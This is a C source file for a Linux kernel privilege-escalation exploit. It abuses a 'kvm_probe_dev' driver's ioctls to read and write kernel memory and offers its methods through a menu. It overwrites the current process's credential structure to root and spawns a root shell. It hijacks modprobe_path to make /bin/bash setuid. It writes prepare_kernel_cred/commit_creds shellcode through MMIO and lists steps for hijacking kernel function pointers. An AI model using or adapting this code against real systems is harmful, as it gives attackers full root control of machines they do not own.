#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <inttypes.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"

#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct va_scan_data {
    unsigned long va;
    unsigned long size;
    unsigned char *user_buffer;
};

struct va_write_data {
    unsigned long va;
    unsigned long size;
    unsigned char *user_buffer;
};

struct mmio_write_data {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct kernel_offsets {
    unsigned long prepare_kernel_cred;
    unsigned long commit_creds;
    unsigned long modprobe_path;
    unsigned long init_task;
    unsigned long init_cred;
};

// Function to write to MMIO
int write_mmio(int fd, unsigned long phys_addr, unsigned char *data, size_t length) {
    struct mmio_write_data req;
    req.phys_addr = phys_addr;
    req.length = length;
    req.user_buf = data;
    
    // Try MMIO write ioctl
    if (ioctl(fd, IOCTL_WRITE_MMIO, &req) < 0) {
        // If MMIO ioctl doesn't exist, fall back to system command
        printf("[!] MMIO ioctl not available, using system command fallback\n");
        
        // Convert data to hex string for system command
        char hex_cmd[512];
        char hex_data[256] = {0};
        
        for (size_t i = 0; i < length && i < 255; i++) {
            sprintf(hex_data + i*2, "%02x", data[i]);
        }
        
        snprintf(hex_cmd, sizeof(hex_cmd), "echo %s | xxd -r -p | kvm_prober writemmio_buf 0x%lx %zu", 
                 hex_data, phys_addr, length);
        
        printf("[*] Executing: %s\n", hex_cmd);
        return system(hex_cmd);
    }
    
    return 0;
}

// Function to write 4-byte value to MMIO
int write_mmio_dword(int fd, unsigned long phys_addr, unsigned int value) {
    unsigned char data[4];
    data[0] = value & 0xFF;
    data[1] = (value >> 8) & 0xFF;
    data[2] = (value >> 16) & 0xFF;
    data[3] = (value >> 24) & 0xFF;
    
    return write_mmio(fd, phys_addr, data, 4);
}

unsigned long find_kernel_symbol(const char *symbol_name) {
    FILE *fp;
    char line[256];
    char sym_name[128];
    unsigned long addr;
    char type;
    
    fp = fopen("/proc/kallsyms", "r");
    if (!fp) {
        perror("Failed to open /proc/kallsyms");
        return 0;
    }
    
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%lx %c %127s", &addr, &type, sym_name) == 3) {
            if (strcmp(sym_name, symbol_name) == 0) {
                fclose(fp);
                return addr;
            }
        }
    }
    
    fclose(fp);
    return 0;
}

unsigned long read_kernel_qword(int fd, unsigned long addr) {
    struct kvm_kernel_mem_read req;
    unsigned long value = 0;
    
    req.kernel_addr = addr;
    req.length = 8;
    req.user_buf = (unsigned char*)&value;
    
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        return 0;
    }
    return value;
}

int write_kernel_qword(int fd, unsigned long addr, unsigned long value) {
    struct kvm_kernel_mem_write req;
    
    req.kernel_addr = addr;
    req.length = 8;
    req.user_buf = (unsigned char*)&value;
    
    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {
        perror("write_kernel_qword failed");
        return -1;
    }
    return 0;
}

int detect_kernel_offsets(struct kernel_offsets *offsets, unsigned long kaslr_slide) {
    printf("[*] Detecting kernel offsets dynamically...\n");
    
    offsets->prepare_kernel_cred = find_kernel_symbol("prepare_kernel_cred");
    offsets->commit_creds = find_kernel_symbol("commit_creds");
    offsets->modprobe_path = find_kernel_symbol("modprobe_path");
    offsets->init_task = find_kernel_symbol("init_task");
    offsets->init_cred = find_kernel_symbol("init_cred");
    
    printf("[+] prepare_kernel_cred: 0x%lx\n", offsets->prepare_kernel_cred);
    printf("[+] commit_creds: 0x%lx\n", offsets->commit_creds);
    printf("[+] modprobe_path: 0x%lx\n", offsets->modprobe_path);
    printf("[+] init_task: 0x%lx\n", offsets->init_task);
    printf("[+] init_cred: 0x%lx\n", offsets->init_cred);
    
    if (!offsets->prepare_kernel_cred || !offsets->commit_creds) {
        printf("[-] Failed to find critical kernel symbols\n");
        return -1;
    }
    
    return 0;
}

int detect_task_struct_offsets(int fd, struct kernel_offsets *koffsets, 
                                unsigned long *cred_offset_out,
                                unsigned long *real_cred_offset_out,
                                unsigned long *pid_offset_out,
                                unsigned long *comm_offset_out) {
    printf("[*] Detecting task_struct field offsets...\n");
    
    if (!koffsets->init_task || !koffsets->init_cred) {
        printf("[-] Need init_task and init_cred symbols\n");
        return -1;
    }
    
    unsigned char task_data[0x2000];
    struct kvm_kernel_mem_read req;
    req.kernel_addr = koffsets->init_task;
    req.length = sizeof(task_data);
    req.user_buf = task_data;
    
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("Failed to read init_task");
        return -1;
    }
    
    unsigned long init_cred_addr = koffsets->init_cred;
    int found_cred = 0, found_real_cred = 0;
    
    for (unsigned long offset = 0; offset < sizeof(task_data) - 8; offset += 8) {
        unsigned long value = *(unsigned long*)(task_data + offset);
        
        if (value == init_cred_addr) {
            if (!found_cred) {
                *real_cred_offset_out = offset;
                found_cred = 1;
                printf("[+] Found real_cred at offset 0x%lx\n", offset);
            } else if (!found_real_cred) {
                *cred_offset_out = offset;
                found_real_cred = 1;
                printf("[+] Found cred at offset 0x%lx\n", offset);
                break;
            }
        }
    }
    
    if (!found_cred || !found_real_cred) {
        printf("[-] Could not find cred offsets, using defaults\n");
        *real_cred_offset_out = 0xa30;
        *cred_offset_out = 0xa38;
    }
    
    *pid_offset_out = 0;
    for (unsigned long offset = 0; offset < 0x500; offset += 4) {
        unsigned int value = *(unsigned int*)(task_data + offset);
        if (value == 1) {
            *pid_offset_out = offset;
            printf("[+] Found pid at offset 0x%lx\n", offset);
            break;
        }
    }
    
    if (!*pid_offset_out) {
        *pid_offset_out = 0x818;
        printf("[*] Using default pid offset 0x%lx\n", *pid_offset_out);
    }
    
    *comm_offset_out = 0;
    for (unsigned long offset = 0; offset < 0xc00; offset++) {
        if (memcmp(task_data + offset, "swapper", 7) == 0) {
            *comm_offset_out = offset;
            printf("[+] Found comm at offset 0x%lx\n", offset);
            break;
        }
    }
    
    if (!*comm_offset_out) {
        *comm_offset_out = 0xac8;
        printf("[*] Using default comm offset 0x%lx\n", *comm_offset_out);
    }
    
    return 0;
}

unsigned long find_current_task_by_pid(int fd, unsigned long init_task_addr, 
                                       unsigned long pid_offset, unsigned long tasks_offset) {
    printf("[*] Searching for current task (PID %d)...\n", getpid());
    
    if (tasks_offset == 0) {
        tasks_offset = 0x848;
    }
    
    unsigned long current = init_task_addr;
    int iterations = 0;
    int our_pid = getpid();
    
    printf("[*] Starting from init_task at 0x%lx, tasks_offset=0x%lx, pid_offset=0x%lx\n", 
           init_task_addr, tasks_offset, pid_offset);
    
    while (iterations++ < 50000) {
        unsigned int pid = 0;
        struct kvm_kernel_mem_read req;
        req.kernel_addr = current + pid_offset;
        req.length = 4;
        req.user_buf = (unsigned char*)&pid;
        
        if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
            printf("[!] Failed to read PID at iteration %d from 0x%lx\n", iterations, current);
            break;
        }
        
        if (iterations % 1000 == 0) {
            printf("[*] Iteration %d: current=0x%lx, pid=%d\n", iterations, current, pid);
        }
        
        if (pid == our_pid) {
            printf("[+] Found our task_struct at 0x%lx after %d iterations\n", current, iterations);
            
            char comm[16] = {0};
            req.kernel_addr = current + 0xac8;
            req.length = 16;
            req.user_buf = (unsigned char*)comm;
            
            if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) == 0) {
                printf("[+] Process name: %s\n", comm);
            }
            
            return current;
        }
        
        unsigned long next_ptr = read_kernel_qword(fd, current + tasks_offset);
        
        // Better validation of next pointer
        if (next_ptr == 0) {
            printf("[!] Hit null pointer at iteration %d\n", iterations);
            break;
        }
        
        if (next_ptr == current + tasks_offset) {
            printf("[!] Hit list cycle (looped back to same task) at iteration %d\n", iterations);
            break;
        }
        
        // Check if pointer looks valid (should be in kernel space)
        if (next_ptr < 0xffff800000000000UL) {
            printf("[!] Invalid next_ptr 0x%lx at iteration %d (not in kernel space)\n", next_ptr, iterations);
            break;
        }
        
        current = next_ptr - tasks_offset;
    }
    
    printf("[-] Could not find our task after %d iterations\n", iterations);
    return 0;
}

int detect_cred_offsets(int fd, unsigned long init_cred_addr,
                       unsigned long *uid_offset,
                       unsigned long *gid_offset,
                       unsigned long *euid_offset,
                       unsigned long *egid_offset) {
    printf("[*] Detecting cred structure offsets...\n");
    
    unsigned char cred_data[0x200];
    struct kvm_kernel_mem_read req;
    req.kernel_addr = init_cred_addr;
    req.length = sizeof(cred_data);
    req.user_buf = cred_data;
    
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("Failed to read init_cred");
        return -1;
    }
    
    int zero_count = 0;
    unsigned long first_zero_offset = 0;
    
    for (unsigned long offset = 0; offset < 0x100; offset += 4) {
        unsigned int value = *(unsigned int*)(cred_data + offset);
        if (value == 0 && zero_count == 0) {
            first_zero_offset = offset;
            zero_count++;
        } else if (value == 0 && zero_count > 0 && offset == first_zero_offset + 4 * zero_count) {
            zero_count++;
        } else if (zero_count >= 8) {
            break;
        } else if (value != 0) {
            zero_count = 0;
            first_zero_offset = 0;
        }
    }
    
    if (zero_count >= 8) {
        *uid_offset = first_zero_offset;
        *gid_offset = first_zero_offset + 4;
        *euid_offset = first_zero_offset + 16;
        *egid_offset = first_zero_offset + 20;
        
        printf("[+] Found credential offsets starting at 0x%lx\n", *uid_offset);
        return 0;
    }
    
    *uid_offset = 0x04;
    *gid_offset = 0x08;
    *euid_offset = 0x14;
    *egid_offset = 0x18;
    
    printf("[*] Using typical credential offsets\n");
    return 0;
}

int exploit_modprobe_path(int fd, struct kernel_offsets *koffsets) {
    printf("\n[*] Attempting modprobe_path exploitation...\n");
    
    if (!koffsets->modprobe_path) {
        printf("[-] modprobe_path address not found\n");
        return -1;
    }
    
    printf("[*] modprobe_path address: 0x%lx\n", koffsets->modprobe_path);
    
    struct kvm_kernel_mem_read req;
    char current_path[256] = {0};
    req.kernel_addr = koffsets->modprobe_path;
    req.length = 256;
    req.user_buf = (unsigned char*)current_path;
    
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("Failed to read modprobe_path");
        return -1;
    }
    
    printf("[*] Current modprobe_path: %s\n", current_path);
    
    const char *exploit_path = "/tmp/evil_modprobe";
    struct kvm_kernel_mem_write wreq;
    wreq.kernel_addr = koffsets->modprobe_path;
    wreq.length = strlen(exploit_path) + 1;
    wreq.user_buf = (unsigned char*)exploit_path;
    
    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &wreq) < 0) {
        perror("Failed to write modprobe_path");
        return -1;
    }
    
    printf("[+] Successfully overwrote modprobe_path!\n");
    
    system("echo '#!/bin/sh\nchmod 4777 /bin/bash\necho \"ROOT SHELL READY\"' > /tmp/evil_modprobe");
    system("chmod +x /tmp/evil_modprobe");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake_bin");
    system("chmod +x /tmp/fake_bin");
    
    printf("[*] Triggering modprobe_path exploit...\n");
    system("/tmp/fake_bin 2>/dev/null");
    
    printf("[*] Check if /bin/bash is now setuid root!\n");
    system("ls -la /bin/bash");
    
    return 0;
}

int exploit_cred_struct(int fd, struct kernel_offsets *koffsets) {
    printf("\n[*] Attempting direct credential structure manipulation...\n");
    
    unsigned long cred_offset = 0, real_cred_offset = 0, pid_offset = 0, comm_offset = 0;
    if (detect_task_struct_offsets(fd, koffsets, &cred_offset, &real_cred_offset, 
                                    &pid_offset, &comm_offset) < 0) {
        printf("[-] Failed to detect task_struct offsets\n");
        return -1;
    }
    
    unsigned long current_task = find_current_task_by_pid(fd, koffsets->init_task, 
                                                          pid_offset, 0x848);
    if (!current_task) {
        printf("[-] Could not find current task_struct\n");
        printf("[!] Trying alternative tasks_offset values...\n");
        
        // Try alternative tasks offsets
        unsigned long alt_offsets[] = {0x840, 0x838, 0x850, 0x858, 0x860};
        for (int i = 0; i < 5; i++) {
            printf("[*] Trying tasks_offset 0x%lx...\n", alt_offsets[i]);
            current_task = find_current_task_by_pid(fd, koffsets->init_task, 
                                                    pid_offset, alt_offsets[i]);
            if (current_task) {
                printf("[+] Found with tasks_offset 0x%lx!\n", alt_offsets[i]);
                break;
            }
        }
        
        if (!current_task) {
            printf("[-] Could not find current task with any offset\n");
            return -1;
        }
    }
    
    unsigned long real_cred_ptr_addr = current_task + real_cred_offset;
    unsigned long cred_ptr_addr = current_task + cred_offset;
    
    printf("[*] Reading cred pointers...\n");
    unsigned long real_cred_struct = read_kernel_qword(fd, real_cred_ptr_addr);
    unsigned long cred_struct = read_kernel_qword(fd, cred_ptr_addr);
    
    if (real_cred_struct < 0xffff800000000000UL || cred_struct < 0xffff800000000000UL) {
        printf("[-] Invalid cred pointers: real_cred=0x%lx, cred=0x%lx\n", 
               real_cred_struct, cred_struct);
        return -1;
    }
    
    printf("[+] Found real_cred structure at: 0x%lx\n", real_cred_struct);
    printf("[+] Found cred structure at: 0x%lx\n", cred_struct);
    
    unsigned long uid_off, gid_off, euid_off, egid_off;
    if (detect_cred_offsets(fd, koffsets->init_cred, &uid_off, &gid_off, 
                           &euid_off, &egid_off) < 0) {
        printf("[-] Failed to detect cred offsets\n");
        return -1;
    }
    
    printf("[*] Overwriting credentials to root (0)...\n");
    
    unsigned int zero = 0;
    struct kvm_kernel_mem_write wreq;
    wreq.length = 4;
    wreq.user_buf = (unsigned char*)&zero;
    
    unsigned long offsets[] = {uid_off, gid_off, uid_off + 8, gid_off + 8, 
                              euid_off, egid_off, euid_off + 8, egid_off + 8};
    
    unsigned long cred_structs[] = {real_cred_struct, cred_struct};
    
    for (int s = 0; s < 2; s++) {
        for (int i = 0; i < 8; i++) {
            wreq.kernel_addr = cred_structs[s] + offsets[i];
            if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &wreq) < 0) {
                perror("Failed to write credential field");
                continue;
            }
        }
    }
    
    printf("[+] Credentials overwritten!\n");
    
    setuid(0);
    setgid(0);
    
    printf("[*] Current UID: %d, GID: %d, EUID: %d, EGID: %d\n", 
           getuid(), getgid(), geteuid(), getegid());
    
    if (getuid() == 0 && geteuid() == 0) {
        printf("[+] SUCCESS! Got root!\n");
        return 0;
    } else {
        printf("[-] Still not root, credential write may have failed\n");
        return -1;
    }
}

int exploit_code_injection(int fd, struct kernel_offsets *koffsets) {
    printf("\n[*] Attempting kernel code injection via MMIO...\n");
    
    if (!koffsets->prepare_kernel_cred || !koffsets->commit_creds) {
        printf("[-] Missing required kernel function addresses\n");
        return -1;
    }

    unsigned char shellcode[] = {
        0x50, 0x53, 0x51, 0x52, 0x56, 0x57,        // push rax, rbx, rcx, rdx, rsi, rdi
        0x48, 0x31, 0xff,                          // xor rdi, rdi
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, [prepare_kernel_cred]
        0xff, 0xd0,                                // call rax
        0x48, 0x89, 0xc7,                          // mov rdi, rax  
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, [commit_creds]
        0xff, 0xd0,                                // call rax
        0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58,        // pop rdi, rsi, rdx, rcx, rbx, rax
        0xc3                                       // ret
    };

    // Fill in function addresses
    *(unsigned long*)(shellcode + 11) = koffsets->prepare_kernel_cred;
    *(unsigned long*)(shellcode + 25) = koffsets->commit_creds;

    printf("[*] Shellcode size: %zu bytes\n", sizeof(shellcode));
    printf("[*] prepare_kernel_cred: 0x%lx\n", koffsets->prepare_kernel_cred);
    printf("[*] commit_creds: 0x%lx\n", koffsets->commit_creds);
    
    // Use MMIO physical address instead of virtual address
    unsigned long physical_addr = 0x2200000;  // Your working physical address
    unsigned long virtual_addr = 0xffffffff82200000;  // Corresponding virtual address
    
    printf("[*] Physical target: 0x%lx\n", physical_addr);
    printf("[*] Virtual mapping: 0x%lx\n", virtual_addr);
    
    printf("\n[*] Writing shellcode via MMIO...\n");
    
    // Pad shellcode to multiple of 4 bytes
    size_t padded_size = (sizeof(shellcode) + 3) & ~3;
    unsigned char padded_shellcode[padded_size];
    memcpy(padded_shellcode, shellcode, sizeof(shellcode));
    memset(padded_shellcode + sizeof(shellcode), 0x90, padded_size - sizeof(shellcode));
    
    // Write shellcode in 4-byte chunks via MMIO
    int success_count = 0;
    for (size_t i = 0; i < padded_size; i += 4) {
        unsigned int value = *(unsigned int*)(padded_shellcode + i);
        
        printf("[*] Writing to 0x%lx: 0x%08x", physical_addr + i, value);
        
        if (write_mmio_dword(fd, physical_addr + i, value) == 0) {
            printf(" [OK]");
            success_count++;
        } else {
            printf(" [FAIL]");
        }
        printf("\n");
    }
    
    printf("[+] Successfully wrote %d/%zu chunks via MMIO\n", success_count, padded_size / 4);
    
    // Verify the shellcode was written correctly by reading back from virtual address
    printf("\n[*] Verifying shellcode at virtual address 0x%lx...\n", virtual_addr);
    
    unsigned char verify_buf[sizeof(shellcode)];
    struct kvm_kernel_mem_read req;
    req.kernel_addr = virtual_addr;
    req.length = sizeof(verify_buf);
    req.user_buf = verify_buf;
    
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) == 0) {
        if (memcmp(shellcode, verify_buf, sizeof(shellcode)) == 0) {
            printf("[+] Shellcode verification successful!\n");
            
            // Print the shellcode for manual verification
            printf("\n[*] Shellcode bytes at 0x%lx:\n", virtual_addr);
            for (size_t i = 0; i < sizeof(shellcode); i += 16) {
                printf("  0x%04lx: ", i);
                for (size_t j = 0; j < 16 && i+j < sizeof(shellcode); j++) {
                    printf("%02x ", verify_buf[i+j]);
                }
                printf("\n");
            }
        } else {
            printf("[-] Shellcode verification failed!\n");
            printf("[!] Bytes don't match expected shellcode\n");
        }
    } else {
        printf("[-] Could not read back shellcode for verification\n");
    }
    
    printf("\n[!] Next steps to trigger exploitation:\n");
    printf("    1. Shellcode is ready at virtual address 0x%lx\n", virtual_addr);
    printf("    2. Find and overwrite a kernel function pointer with 0x%lx\n", virtual_addr);
    printf("    3. Common targets: file_operations, proc_ops, timer callbacks\n");
    printf("    4. Trigger the hijacked function to execute shellcode\n");
    printf("    5. Shellcode will call prepare_kernel_cred(0) -> commit_creds() for root\n");
    
    return (success_count == padded_size / 4) ? 0 : -1;
}

void print_menu() {
    printf("\n=== Privilege Escalation Exploit Menu ===\n");
    printf("1. Direct Credential Manipulation (recommended)\n");
    printf("2. modprobe_path Exploitation\n");
    printf("3. Kernel Code Injection (advanced)\n");
    printf("4. Auto-detect and exploit\n");
    printf("5. Exit\n");
    printf("Choose method: ");
}

int main(int argc, char *argv[]) {
    int fd;
    unsigned long kaslr_slide = 0;
    struct kernel_offsets koffsets = {0};
    
    printf("[*] KVM Probe Privilege Escalation Exploit\n");
    printf("[*] Dynamic Offset Detection Version\n");
    printf("[*] Opening device %s\n", DEVICE_PATH);
    
    fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("Failed to open device");
        printf("[-] Make sure the kvm_probe_drv module is loaded\n");
        return 1;
    }
    
    printf("[*] Getting KASLR slide...\n");
    if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &kaslr_slide) < 0) {
        perror("Failed to get KASLR slide");
        close(fd);
        return 1;
    }
    
    printf("[+] KASLR slide: 0x%lx\n", kaslr_slide);
    
    if (detect_kernel_offsets(&koffsets, kaslr_slide) < 0) {
        printf("[-] Failed to detect kernel offsets\n");
        printf("[!] Make sure you have read access to /proc/kallsyms\n");
        printf("[!] You may need to: sudo sysctl kernel.kptr_restrict=0\n");
        close(fd);
        return 1;
    }
    
    printf("\n[*] Kernel symbol addresses detected:\n");
    printf("    prepare_kernel_cred: 0x%lx\n", koffsets.prepare_kernel_cred);
    printf("    commit_creds:        0x%lx\n", koffsets.commit_creds);
    printf("    modprobe_path:       0x%lx\n", koffsets.modprobe_path);
    printf("    init_task:           0x%lx\n", koffsets.init_task);
    printf("    init_cred:           0x%lx\n", koffsets.init_cred);
    
    if (argc > 1) {
        int method = atoi(argv[1]);
        switch(method) {
            case 1:
                exploit_cred_struct(fd, &koffsets);
                break;
            case 2:
                exploit_modprobe_path(fd, &koffsets);
                break;
            case 3:
                exploit_code_injection(fd, &koffsets);
                break;
            default:
                printf("[-] Invalid method\n");
        }
    } else {
        int choice;
        while (1) {
            print_menu();
            if (scanf("%d", &choice) != 1) {
                while(getchar() != '\n');
                continue;
            }
            
            switch(choice) {
                case 1:
                    if (exploit_cred_struct(fd, &koffsets) == 0) {
                        printf("\n[+] Exploitation successful!\n");
                        printf("[*] Spawning root shell...\n");
                        system("/bin/bash -i");
                        close(fd);
                        return 0;
                    }
                    break;
                case 2:
                    exploit_modprobe_path(fd, &koffsets);
                    break;
                case 3:
                    exploit_code_injection(fd, &koffsets);
                    break;
                case 4:
                    printf("[*] Auto-detect mode: Trying direct credential manipulation first...\n");
                    if (exploit_cred_struct(fd, &koffsets) == 0) {
                        printf("[*] Spawning root shell...\n");
                        system("/bin/bash -i");
                        close(fd);
                        return 0;
                    }
                    printf("[*] Trying modprobe_path method...\n");
                    exploit_modprobe_path(fd, &koffsets);
                    break;
                case 5:
                    close(fd);
                    return 0;
                default:
                    printf("[-] Invalid choice\n");
            }
        }
    }
    
    close(fd);
    return 0;
}
